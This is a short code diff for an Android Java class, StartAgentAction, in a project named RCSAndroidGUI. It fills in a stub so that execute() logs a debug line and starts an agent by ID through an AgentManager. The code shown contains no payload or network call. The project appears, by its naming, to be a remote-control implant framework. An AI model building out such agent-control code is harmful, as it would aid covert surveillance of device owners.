@@ -8,12 +8,19 @@
  * *******************************************/
 package com.ht.RCSAndroidGUI.action;
 
-// TODO: Auto-generated Javadoc
+import java.io.IOException;
+
+import com.ht.RCSAndroidGUI.agent.AgentManager;
+import com.ht.RCSAndroidGUI.util.DataBuffer;
+
+import android.util.Log;
+
 /**
  * The Class StartAgentAction.
  */
-public class StartAgentAction extends SubAction {
-
+public class StartAgentAction extends AgentAction {
+	private static final String TAG = "StartAgentAction";
+	
 	/**
 	 * Instantiates a new start agent action.
 	 * 
@@ -33,14 +40,11 @@ public class StartAgentAction extends SubAction {
 	 */
 	@Override
 	public boolean execute() {
-		// TODO Auto-generated method stub
-		return false;
-	}
+		Log.d("QZ", TAG + " (execute): " + agentId);
+		final AgentManager agentManager = AgentManager.self();
 
-	@Override
-	protected boolean parse(byte[] params) {
-		// TODO Auto-generated method stub
-		return false;
+		agentManager.start(agentId);
+		return true;
 	}
 
 }
